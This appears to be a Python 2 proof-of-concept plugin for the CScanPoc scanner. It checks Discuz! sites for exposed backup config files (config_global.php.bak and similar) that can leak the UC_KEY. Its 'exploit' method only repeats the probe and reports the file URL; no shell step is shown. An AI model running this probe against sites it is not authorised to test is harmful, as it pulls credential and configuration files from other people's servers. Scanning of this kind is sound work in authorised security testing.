# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib
import urllib2
import re


class Vuln(ABVuln):
    vuln_id = 'Discuz_0020'  # 平台漏洞编号，留空
    name = 'Discuz! 敏感文件备份导致uc_key泄露GETSHELL'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2014-01-10'  # 漏洞公布时间
    desc = '''
        Discuz! 存在一些敏感文件，如果存在备份的话，可能导致UC_KEY的泄露从而进行GETSHELL。
    '''  # 漏洞描述
    ref = 'https://phpinfo.me/2014/01/10/182.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Discuz!'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'd00da189-0063-4bfe-8ed2-9a8909ff1844'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-06'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            bak_list = ['/config/config_global.php.bak',
                        '/uc_server/data/config.inc.php.bak', '/config/config_ucenter.php.bak']
            for bak_url in bak_list:
                verify_url = '{target}'.format(target=self.target)+bak_url
                try:
                    req = urllib2.urlopen(verify_url)
                    content = req.read()
                except:
                    continue
                if req.getcode() == 200:
                    if '<?php' in content:
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))

            bak_list = ['/config/config_global.php.bak',
                        '/uc_server/data/config.inc.php.bak', '/config/config_ucenter.php.bak']
            for bak_url in bak_list:
                verify_url = '{target}'.format(target=self.target)+bak_url
                try:
                    req = urllib2.urlopen(verify_url)
                    content = req.read()
                except:
                    continue
                if req.getcode() == 200:
                    if '<?php' in content:
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到的漏洞的url为{url}'.format(
                            target=self.target, name=self.vuln.name, url=verify_url))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
